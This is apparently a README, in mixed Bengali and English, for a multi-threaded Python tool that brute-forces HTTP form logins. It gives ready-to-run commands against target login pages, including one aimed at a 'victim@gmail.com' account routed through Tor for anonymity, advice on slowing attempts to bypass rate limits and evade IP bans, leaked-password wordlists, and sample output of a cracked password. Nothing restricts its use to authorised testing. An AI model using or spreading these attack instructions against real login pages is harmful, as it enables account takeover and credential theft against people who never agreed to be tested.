# BruteForce — HTTP Form Login Attacker

```
  ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   █████╗
  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝
  ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
        WEB LOGIN BRUTE FORCE — @#9002111185000#
```

যেকোনো HTTP form-based login panel এ dictionary/brute force attack চালানোর জন্য Python tool।
Multi-threaded, proxy support, custom fields, wordlist-driven।

---

## Features

- Multi-threaded — দ্রুত attack (default 10 threads, max যতখুশি)
- যেকোনো HTTP POST form support করে
- Custom field names (email, username, user, pass, password — যা হোক)
- Failure string detection — response text check করে hit বোঝে
- Proxy support — Burp Suite, OWASP ZAP, Tor
- Extra hidden fields — CSRF token, remember_me, etc.
- Hit হলে `cracked.txt` এ auto-save
- Request delay — rate limit bypass এর জন্য
- SSL verify disabled — self-signed cert এ কাজ করে

---

## Requirements

```
Python 3.8+
requests
colorama
```

```bash
pip install requests colorama
```

---

## Installation

```bash
git clone https://github.com/yourrepo/bruteforce
cd bruteforce
pip install -r requirements.txt
```

অথবা শুধু `brute.py` download করে রান করো।

---

## Usage

### Basic Syntax

```bash
python brute.py -u <URL> -U <USERNAME> -w <WORDLIST> [options]
```

### Arguments

| Flag | Long Form | Description | Default |
|------|-----------|-------------|---------|
| `-u` | `--url` | Target login URL | required |
| `-U` | `--username` | Attack করার username/email | required |
| `-w` | `--wordlist` | Password wordlist path | required |
| `-uf` | `--user-field` | Form এর username field name | `email` |
| `-pf` | `--pass-field` | Form এর password field name | `pass` |
| `-f` | `--fail` | Login fail হলে response এ যে string থাকে | `invalid password` |
| `-t` | `--threads` | Thread count | `10` |
| `-d` | `--delay` | Attempt এর মাঝে delay (seconds) | `0` |
| `-x` | `--proxy` | Proxy URL | None |
| `-e` | `--extra` | Extra POST fields | None |

---

## Examples

### Example 1 — Basic Attack

```bash
python brute.py \
  -u "http://target.com/login.php" \
  -U "admin@target.com" \
  -w rockyou.txt \
  -uf "email" \
  -pf "password" \
  -f "Wrong password"
```

### Example 2 — Fast Attack (20 Threads)

```bash
python brute.py \
  -u "http://target.com/login" \
  -U admin \
  -w wordlist.txt \
  -t 20
```

### Example 3 — Proxy দিয়ে (Burp Suite)

```bash
python brute.py \
  -u "http://target.com/login" \
  -U admin \
  -w rockyou.txt \
  -x http://127.0.0.1:8080
```

### Example 4 — Tor দিয়ে Anonymous

```bash
# Tor চালু করো আগে
python brute.py \
  -u "http://target.com/login" \
  -U victim@gmail.com \
  -w rockyou.txt \
  -x socks5://127.0.0.1:9050
```

### Example 5 — CSRF Token সহ

```bash
python brute.py \
  -u "http://target.com/login" \
  -U admin \
  -w wordlist.txt \
  -e "_token=xyzABC123,remember=1"
```

### Example 6 — Rate Limit Bypass (Slow Attack)

```bash
python brute.py \
  -u "http://target.com/login" \
  -U admin \
  -w wordlist.txt \
  -d 2.5 \
  -t 1
```

---

## কিভাবে Fail String বের করবো

Burp Suite অথবা Browser DevTools দিয়ে:

1. Target login page এ যাও
2. ভুল password দিয়ে login করো
3. Response body দেখো
4. যে unique string আসে (যেমন: `"Invalid credentials"`, `"Wrong password"`, `"Login failed"`) সেটা `-f` এ দাও

```bash
# উদাহরণ
-f "Invalid credentials"
-f "Wrong password"
-f "Login failed"
-f "Incorrect email or password"
```

---

## কিভাবে Form Field Names বের করবো

Browser এ Right Click → Inspect Element → Network Tab:

```html
<!-- এই form এর জন্য -->
<input name="email" type="email">
<input name="pass" type="password">

<!-- Command হবে -->
python brute.py -uf email -pf pass ...
```

অথবা Burp Suite দিয়ে POST request intercept করে field names দেখো।

---

## Output

```
[*] Target   : http://target.com/login
[*] Username : admin@target.com
[*] Wordlist : 14344392 passwords
[*] Threads  : 10
[*] Fail str : 'invalid password'

[1] Trying: admin@target.com:123456      [HTTP 200]
[2] Trying: admin@target.com:password    [HTTP 200]
[3] Trying: admin@target.com:admin123    [HTTP 200]
...
[+] FOUND! Username: admin@target.com  Password: letmein2024
```

Hit পেলে `cracked.txt` এ save হয়:
```
http://target.com/login | admin@target.com | letmein2024
```

---

## Recommended Wordlists

| Wordlist | Size | Best For |
|----------|------|----------|
| `rockyou.txt` | 14M passwords | সাধারণ accounts |
| `darkweb2017.txt` | 1.4M passwords | leaked passwords |
| `SecLists/Passwords/Common-Credentials/` | Various | targeted attack |
| Custom wordlist | তোমার তৈরি | specific target |

SecLists থেকে পাবে:
```bash
git clone https://github.com/danielmiessler/SecLists
```

---

## Tips

- **Burp Suite দিয়ে প্রথমে request inspect করো** — field names, hidden inputs, CSRF tokens বোঝার জন্য
- **Rate limit আছে কিনা দেখো** — থাকলে `-d 1` বা `-d 2` delay দাও, thread কমাও
- **Fail string সঠিক দাও** — ভুল string দিলে সব attempt "success" দেখাবে
- **rockyou.txt সবচেয়ে effective** — common passwords কভার করে
- **Tor/proxy ব্যবহার করো** IP ban এড়াতে

---

## File Structure

```
bruteforce/
├── brute.py          # Main tool
├── README.md         # This file
├── requirements.txt  # Dependencies
└── cracked.txt       # Auto-generated on hit (gitignore এ রাখো)
```

---

## requirements.txt

```
requests>=2.31.0
colorama>=0.4.6
```

---

*Built by Ochena Gamer 👿 — @#9002111185000#*
